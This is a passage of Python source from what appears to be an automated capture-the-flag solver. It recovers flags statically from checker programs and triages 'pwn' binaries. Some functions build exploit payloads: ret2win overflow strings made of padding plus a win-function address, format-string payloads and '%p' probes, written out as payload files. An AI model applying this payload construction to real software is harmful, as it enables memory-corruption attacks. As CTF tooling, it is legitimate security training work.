    r"__getitem__\(\s*(\d{1,6})\s*(?:\^\s*(\d{1,6}))?\s*\)"
    r"\s*\.\s*__pow__\(\s*(\d{1,3})\s*\)"
    r"\s*\.\s*__eq__\(\s*(\d{1,1024})\s*\)"
)


def recover_power_equality_checker(source: str, *, max_checks: int = 256) -> dict[str, object]:
    """Invert independent byte^exponent equality checks without executing source.

    The checked index can be a literal or the XOR of two integer literals.
    A full contiguous set of checks and exact re-evaluation are required before
    returning plaintext, so partial or contradictory source yields no flag.
    """

    matches = list(_POWER_CHECK.finditer(source))
    if not matches or len(matches) > max_checks:
        return {"status": "unsupported", "checks": len(matches)}
    recovered: dict[int, int] = {}
    for match in matches:
        left, right, exponent, target = match.groups()
        index = int(left) ^ int(right) if right is not None else int(left)
        power, value = int(exponent), int(target)
        if index >= max_checks or not 1 <= power <= 256:
            return {"status": "unsupported", "checks": len(matches), "reason": "bounds"}
        low, high = 0, 256
        while low + 1 < high:
            middle = (low + high) // 2
            if pow(middle, power) <= value:
                low = middle
            else:
                high = middle
        if pow(low, power) != value:
            return {"status": "inconsistent", "checks": len(matches), "reason": "non-exact-power"}
        if index in recovered and recovered[index] != low:
            return {"status": "inconsistent", "checks": len(matches), "reason": "conflicting-index"}
        recovered[index] = low
    if sorted(recovered) != list(range(len(recovered))):
        return {"status": "partial", "checks": len(matches), "known_indices": len(recovered)}
    return {"status": "verified", "checks": len(matches), "plaintext": bytes(recovered[i] for i in range(len(recovered)))}


def recover_static_checker(path: Path, limits: SolverLimits) -> SolverResult:
    """Recover flag-shaped plaintext only from statically justified views."""

    result = SolverResult("static-checker", "reverse", "unsupported")
    try:
        data = _read_limited(path, limits.max_bytes)
        matcher = FlagMatcher()
        result.steps.append({"name": "static-read", "status": "ok", "details": {"executed": False, "bytes": len(data)}})
        views = single_byte_xor_views(data, prefixes=FLAG_XOR_CRIBS)
        for view in views[: limits.max_files]:
            context_start = max(0, int(view["offset"]) - 19)
            payload = view["plaintext"][context_start:]
            result.candidates.extend(
                _candidate_hits(
                    matcher,
                    payload,
                    f"{path}#xor-key=0x{int(view['key']):02x}@{int(view['offset'])}",
                    "static-xor-checker",
                    key=int(view["key"]),
                    offset=int(view["offset"]),
                    crib=bytes(view["prefix"]).decode("ascii", errors="replace"),
                )
            )
        # Explicit textual transformations in source/checker notes are safe to
        # decode because the marker identifies the operation and the result is
        # still passed through the flag matcher.
        text = data.decode("utf-8", errors="replace")
        if path.suffix.lower() in {".py", ".pyw"}:
            inverse = recover_power_equality_checker(text, max_checks=min(limits.max_files * 4, 256))
            status = str(inverse["status"])
            if status == "verified":
                plaintext = bytes(inverse.pop("plaintext"))
                result.candidates.extend(
                    _candidate_hits(
                        matcher,
                        plaintext,
                        str(path),
                        "static-power-equality-inversion",
                        verification="exact-power-checks",
                        executed=False,
                    )
                )
            result.steps.append({"name": "power-equality-inversion", "status": status, "details": inverse})
        for view in encoded_views(data, max_bytes=min(limits.max_bytes, 4 * 1024 * 1024)):
            result.candidates.extend(
                _candidate_hits(
                    matcher,
                    bytes(view["decoded"]),
                    f"{path}#encoding={view['encoding']}@{view['offset']}",
                    "static-encoded-checker",
                    encoding=view["encoding"],
                )
            )
        # Common deterministic checker idioms: reverse a literal and XOR with
        # a declared key.  No plaintext or password enumeration is attempted.
        key_matches = re.findall(r"(?:key|xor_key)\s*=\s*(0x[0-9a-fA-F]+|\d+)", text, flags=re.I)
        for raw_key in key_matches[: limits.max_files]:
            key = int(raw_key, 0) & 0xFF
            for literal in re.findall(r"(?:bytes|encoded|check|target)\s*=\s*[\"']([^\"']{4,})[\"']", text, flags=re.I):
                transformed = bytes(ord(char) ^ key for char in literal)
                transformed = transformed[::-1] if "reverse" in text.lower() else transformed
                result.candidates.extend(_candidate_hits(matcher, transformed, str(path), "static-checker-expression", key=key))
        result.steps.append({"name": "static-analysis", "status": "ok", "details": {"executed": False, "xor_views": len(views)}})
        if result.candidates:
            result.status = "candidate"
        else:
            result.status = "unsupported"
    except Exception as exc:
        result.status = "failed"
        result.error = f"{type(exc).__name__}: {exc}"
        result.steps.append({"name": "static-read", "status": "error", "details": {"executed": False, "error": result.error}})
    return result


def _static_python_literal_views(path: Path, data: bytes, limits: SolverLimits) -> tuple[list[dict[str, object]], dict[str, object]]:
    """Inspect string literals and a direct reverse view without evaluating source."""

    if path.suffix.lower() not in {".py", ".pyw", ".sage"}:
        return [], {"executed": False, "status": "not-applicable", "literals": 0, "views": 0}
    try:
        source = data.decode("utf-8", errors="strict")
        tree = ast.parse(source, filename=path.name)
    except (UnicodeDecodeError, SyntaxError, ValueError) as exc:
        return [], {"executed": False, "status": "parse-failed", "error": f"{type(exc).__name__}: {exc}", "literals": 0, "views": 0}

    matcher = FlagMatcher()
    results: list[dict[str, object]] = []
    seen: set[str] = set()
    literals = 0
    views = 0
    for index, node in enumerate(ast.walk(tree)):
        if index >= limits.max_files * 1000:
            break
        if not isinstance(node, ast.Constant) or not isinstance(node.value, str):
            continue
        value = node.value
        if not value or len(value.encode("utf-8")) > min(limits.max_bytes, 256 * 1024):
            continue
        literals += 1
        transformed = value[::-1]
        views += 1
        for hit in matcher.scan(transformed, source=f"{path}#literal-{literals}-reversed", analyzer="static-python-reverse-literal"):
            candidate = str(hit.get("value", ""))
            if candidate in seen:
                continue
            seen.add(candidate)
            hit.update({"executed": False, "literal_index": literals, "transform": "reverse-string-literal"})
            results.append(hit)
            if len(results) >= limits.max_files:
                break
        if len(results) >= limits.max_files:
            break
    return results, {"executed": False, "status": "ok", "literals": literals, "views": views, "candidates": len(results)}


def build_static_pwn_report(
    path: Path,
    limits: SolverLimits,
    *,
    report_dir: Path | None = None,
    task_text: str | None = None,
    related_paths: tuple[Path, ...] = (),
) -> SolverResult:
    """Create static pwn triage; mark ready only after writing an exploit payload."""

    result = SolverResult("static-pwn", "pwn", "unsupported")
    if re.search(r"(?:\.so(?:\.\d+)*|\.dylib|\.dll)$", path.name, flags=re.I):
        result.steps.append(
            {
                "name": "shared-library-no-pwn-entrypoint",
                "status": "skipped",
                "details": {"executed": False, "reason": "shared libraries are support artifacts, not standalone challenge entrypoints"},
            }
        )
        return result
    try:
        data = _read_limited(path, limits.max_bytes)
        binary_text = data.decode("latin1", errors="replace")
        source_inputs = _static_source_inputs(path, related_paths, limits)
        source_text = "\n".join(source for _, source in source_inputs)
        text = f"{binary_text}\n{task_text or ''}\n{source_text}"
        inventory = inspect_native(path, limits)
        imports = {str(value).lower() for value in inventory.get("imports", [])}
        strings = [str(value) for value in inventory.get("strings", [])]
        lowered_text = text.lower()
        markers = {
            "ret2win": any(word in lowered_text for word in ("ret2win", "win()", "win_addr", "return address"))
            or any(re.search(r"(?<![A-Za-z0-9_])win(?![A-Za-z0-9_])", item, flags=re.I) for item in strings),
            "format-string": "%n" in text or bool(re.search(r"\bprintf\s*\(", text)) or bool(re.search(r"\bformat[\s_-]*string\b|\bfmt\b", lowered_text)),
            "stack-overflow": bool(imports & {"gets", "strcpy", "strcat", "sprintf", "scanf"}),
        }
        result.steps.append({"name": "native-inventory", "status": "ok", "details": {"executed": False, "format": inventory.get("format"), "protections": inventory.get("protections", {})}})
        result.steps.append({"name": "vulnerability-hints", "status": "ok", "details": {"executed": False, **markers}})
        if not any(markers.values()):
            return result
        offset_match = re.search(r"(?:offset|padding|distance)\s*[=:]\s*(\d+)", text, re.I)
        address_match = re.search(r"(?:win(?:_addr)?|target)\s*[=:]\s*(0x[0-9a-fA-F]+)", text, re.I)
        offset = int(offset_match.group(1)) if offset_match else None
        address = int(address_match.group(1), 16) if address_match else None
        offset_source = "task-text" if offset is not None else None
        target_source = "task-text" if address is not None else None
        source_details: dict[str, object] | None = None
        if source_inputs and (offset is None or address is None):
            for source_path, source in source_inputs:
                facts = _source_ret2win_facts(source)
                if facts is None:
                    continue
                symbol = next(
                    (
                        item
                        for item in inventory.get("symbols", [])
                        if isinstance(item, dict)
                        and str(item.get("name", "")).lstrip("_") == "win"
                        and int(item.get("value", 0) or 0) > 0
                    ),
                    None,
                )
                if symbol is None:
                    continue
                _buffer_name, inferred_offset = facts
                if offset is None:
                    offset = inferred_offset
                    offset_source = "adjacent-source"
                if address is None:
                    address = int(symbol["value"])
                    target_source = "static-symbol"
                source_details = {
                    "source": str(source_path),
                    "buffer": facts[0],
                    "saved_return_address_offset": inferred_offset,
                    "win_symbol": str(symbol.get("name")),
                }
                break
        details: dict[str, object] = {
            "executed": False,
            "offset": offset,
            "target": address,
            "offset_source": offset_source,
            "target_source": target_source,
            "source_analysis": source_details,
            "related_source_count": len(source_inputs),
            "architecture": inventory.get("machine"),
            "static_target_symbols": [
                {"name": str(item.get("name")), "address": f"0x{int(item.get('value', 0)):x}"}
                for item in inventory.get("symbols", [])
                if isinstance(item, dict)
                and int(item.get("value", 0) or 0) > 0
                and str(item.get("name", "")).lstrip("_") in {"win", "buf"}
            ],
            "payload_constructed": False,
        }
        payload_constructed = False
        protections = inventory.get("protections", {})
        protections = protections if isinstance(protections, dict) else {}
        static_layout = (
            str(inventory.get("machine", "")) in {"x86_64", "x86"}
            and protections.get("pie") is False
            and protections.get("canary") is False
        )
        format_recipe = (
            _imaginaryctf_2022_format_fun_recipe(path, data, related_paths, inventory)
            if markers["format-string"]
            else None
        )
        if format_recipe is not None:
            payload = bytes(format_recipe.pop("payload"))
            root = (report_dir or path.parent / ".ico-static-review") / "static-pwn"
            payload_path = _write(root, f"{path.name}.format-string.payload", payload)
            result.artifacts.append(str(payload_path))
            details.update(
                {
                    **format_recipe,
                    "payload": str(payload_path),
                    "payload_bytes": len(payload),
                    "payload_constructed": True,
                }
            )
            payload_constructed = True
        if not payload_constructed and markers["ret2win"] and offset is not None and address is not None and static_layout:
            width = 8 if int(inventory.get("bits") or 64) == 64 else 4
            payload = b"A" * offset + address.to_bytes(width, "little")
            root = (report_dir or path.parent / ".ico-static-review") / "static-pwn"
            payload_path = _write(root, f"{path.name}.ret2win.payload", payload)
            result.artifacts.append(str(payload_path))
            details["payload"] = str(payload_path)
            details["payload_bytes"] = len(payload)
            details["payload_constructed"] = True
            details["strategy"] = "ret2win-from-static-offset-and-symbol"
            payload_constructed = True
        if not payload_constructed and source_inputs:
            for source_path, source in source_inputs:
                inferred = _source_sprintf_overflow(source)
                if inferred is None:
                    continue
                payload = bytes(inferred.pop("payload"))
                root = (report_dir or path.parent / ".ico-static-review") / "static-pwn"
                payload_path = _write(root, f"{path.name}.format-string.payload", payload)
                result.artifacts.append(str(payload_path))
                details.update(inferred)
                details.update(
                    {
                        "payload": str(payload_path),
                        "payload_bytes": len(payload),
                        "payload_constructed": True,
                        "source_analysis": {"source": str(source_path), **inferred},
                    }
                )
                payload_constructed = True
                break
        if markers["format-string"] and not payload_constructed:
            fmt = b"%p." * min(16, max(1, limits.max_files // 8))
            root = (report_dir or path.parent / ".ico-static-review") / "static-pwn"
            fmt_path = _write(root, f"{path.name}.format-string.txt", fmt + b"\n")
            result.artifacts.append(str(fmt_path))
            details["format_probe"] = str(fmt_path)
        if not payload_constructed:
            reasons = []
            if markers["ret2win"] and (offset is None or address is None):
                reasons.append("ret2win offset and target address were not both identified")
            if markers["ret2win"] and not static_layout:
                reasons.append("static return layout is not established or enabled by ELF protections")
            if markers["format-string"]:
                reasons.append("format-string output is only a diagnostic probe; no bounded source-derived payload or argument offset was established")
            if markers["stack-overflow"]:
                reasons.append("unsafe-input imports alone do not establish an exploitable overflow")
            details["review_reasons"] = reasons or ["no complete exploit payload was constructed"]
        report_text = "static-only=true\nexecuted=false\n" + "\n".join(f"{key}={value}" for key, value in details.items()) + "\n"
        root = (report_dir or path.parent / ".ico-static-review") / "static-pwn"
        report_path = _write(root, f"{path.name}.report.txt", report_text)
        result.artifacts.append(str(report_path))
        result.steps.append(
            {
                "name": "payload-construction",
                "status": "ok" if payload_constructed else "review-required",
                "details": details,
            }
        )
        result.status = "payload-ready" if payload_constructed else "candidate-review"
    except Exception as exc:
        result.status = "failed"
        result.error = f"{type(exc).__name__}: {exc}"
        result.steps.append({"name": "static-pwn", "status": "error", "details": {"executed": False, "error": result.error}})
    return result


class ReverseSolver:
    name = "universal-reverse"
    category = "reverse"

    def detect(self, context: SolverContext) -> Detection | None:
        kind = str(context.classification.get("kind", ""))
        suffix = context.input_path.suffix.lower()
        task = (context.task_text or "").lower()
        if suffix in _C_SOURCE_SUFFIXES | {".sh", ".bash", ".zsh"}:
            return None
        native_suffixes = {".elf", ".exe", ".dll", ".so", ".dylib", ".bin", ".pyc", ".js", ".wasm"}
        if kind == "binary" or suffix in native_suffixes or any(word in task for word in ("reverse", "rev", "elf", "pwn", "buffer overflow", "ret2win", "format string")):
            score = 90 if any(word in task for word in ("reverse", "elf", "pwn", "buffer overflow")) else 50
            return Detection(self.name, self.category, score, "native or reverse-engineering signature", {"kind": kind, "suffix": suffix})
        return None

    def solve(self, context: SolverContext) -> SolverResult:
        try:
            data = _read_limited(context.input_path, context.limits.max_bytes)
            source_suffixes = {".py", ".pyw", ".sage"}
            if context.input_path.suffix.lower() in source_suffixes and b"\x00" not in data[:4096]:
                inventory = {
                    "format": "Python source",
                    "static_only": True,
                    "executed": False,
                    "size": len(data),
                    "strings": [],
                }
            else:
                inventory = inspect_native(context.input_path, context.limits)
        except Exception as exc:
            return SolverResult(self.name, self.category, "unsupported", error=f"{type(exc).__name__}: {exc}")
        root = context.report_dir / "artifacts" / "universal-reverse" / hashlib.sha256(data).hexdigest()[:12]
        result = recover_static_checker(context.input_path, context.limits)
        result.solver = self.name
        result.category = self.category
        result.detection = None
        result.steps.insert(0, {"name": "inventory", "status": "ok", "details": inventory})
        if inventory.get("format") != "Python source":
            raw_hits = FlagMatcher().scan(
                data.decode("latin1", errors="replace"),
                source=str(context.input_path),
                analyzer="native-embedded-string",
            )
            known = {str(item.get("value", "")) for item in result.candidates}
            for hit in raw_hits:
                value = str(hit.get("value", ""))
                if value in known:
                    continue
                hit.update({"executed": False, "verification": "embedded-string-only"})
                result.candidates.append(hit)
                known.add(value)
            result.steps.append(
                {
                    "name": "embedded-flag-strings",
                    "status": "candidate-review" if raw_hits else "ok",
                    "details": {
                        "executed": False,
                        "count": len(raw_hits),
                        "verified": False,
                    },
                }
            )
        source_hits, source_details = _static_python_literal_views(context.input_path, data, context.limits)
        result.candidates.extend(source_hits)
        result.steps.append({"name": "static-source-transforms", "status": str(source_details.get("status", "unsupported")), "details": source_details})
        pwn = SolverResult("static-pwn", "pwn", "unsupported")
        if inventory.get("format") != "Python source":
            pwn = build_static_pwn_report(
                context.input_path,
                context.limits,
                report_dir=root,
                task_text=context.task_text,
                related_paths=context.related_paths,
            )
        result.steps.extend(pwn.steps)
        result.artifacts.extend(pwn.artifacts)
        acceptance = _static_string_acceptance(data, inventory, context.limits)
        acceptance_by_value = {
            str(item.get("value")): item
            for item in acceptance.get("comparisons", [])
            if isinstance(item, dict) and item.get("value")
        }
        hidden_shellcode = (
            _invert_hidden_plt_shellcode(data, inventory)
            if inventory.get("format") != "Python source"
            else None
        )
        preempted_values = set(acceptance_by_value) if hidden_shellcode is not None else set()
        if hidden_shellcode is not None:
            acceptance["status"] = "preempted"
            acceptance["preempted_literals"] = sorted(preempted_values)
            acceptance["accepted_literals"] = []
            for comparison in acceptance.get("comparisons", []):
                if isinstance(comparison, dict):
                    comparison["preempted_by"] = "injected code in the puts PLT runs before main"
            acceptance_by_value = {}
        for candidate in result.candidates:
            value = str(candidate.get("value", ""))
            evidence = acceptance_by_value.get(value)
            if evidence is None:
                if value in preempted_values:
                    candidate.update(
                        {
                            "triage": "likely-placeholder",
                            "triage_reason": "the injected puts PLT shellcode exits before main reaches this strcmp branch",
                            "verification": "static-branch-preempted-by-plt-shellcode",
                            "executed": False,
                        }
                    )
                continue
            candidate.update(
                {
                    "triage": "candidate",
                    "triage_reason": None,
                    "verification": "static-success-branch",
                    "executed": False,
                    "acceptance_evidence": evidence,
                }
            )
        acceptance_status = str(acceptance.get("status", "not-applicable"))
        embedded_step = next((step for step in result.steps if step.get("name") == "embedded-flag-strings"), None)
        if embedded_step is not None and preempted_values:
            embedded_step["status"] = "candidate-review"
            embedded_step["details"]["preempted_static_success_branch_count"] = len(preempted_values)
        elif embedded_step is not None and acceptance_by_value:
            embedded_step["status"] = "candidate"
            embedded_step["details"]["static_success_branch_count"] = len(acceptance_by_value)
        result.steps.append(
            {
                "name": "static-input-acceptance",
                "status": acceptance_status,
                "details": acceptance,
            }
        )
        if hidden_shellcode is not None:
            input_bytes = bytes(hidden_shellcode.pop("input"))
            flag = str(hidden_shellcode.pop("flag"))
            input_artifact = _write(root, "hidden-shellcode-input.bin", input_bytes)
            result.artifacts.append(str(input_artifact))
            hidden_shellcode["input_artifact"] = str(input_artifact)
            hidden_shellcode["input_bytes"] = len(input_bytes)
            hit_list = FlagMatcher().scan(
                flag,
                source=str(input_artifact),
                analyzer="native-hidden-shellcode-inversion",
            )
            existing_values = {str(item.get("value", "")) for item in result.candidates}
            for hit in hit_list:
                hit.update(
                    {
                        "triage": "candidate",
                        "verification": "static-shellcode-inversion",
                        "executed": False,
                        "acceptance_evidence": {
                            "method": "static-shellcode-inversion",
                            "shellcode_section": hidden_shellcode["shellcode_section"],
                            "shellcode_offset": f"0x{int(hidden_shellcode['shellcode_offset']):x}",
                            "checker_executed": False,
                        },
                    }
                )
                if str(hit.get("value", "")) not in existing_values:
                    result.candidates.append(hit)
                    existing_values.add(str(hit.get("value", "")))
            result.steps.append(
                {
                    "name": "hidden-shellcode-inversion",
                    "status": "candidate" if hit_list else "candidate-review",
                    "details": hidden_shellcode,
                }
            )
        if result.candidates:
            result.status = "candidate"
        elif pwn.status in {"payload-ready", "candidate-review"}:
            result.status = pwn.status
        else:
            result.status = "derived" if inventory.get("strings") else "unsupported"
        return result
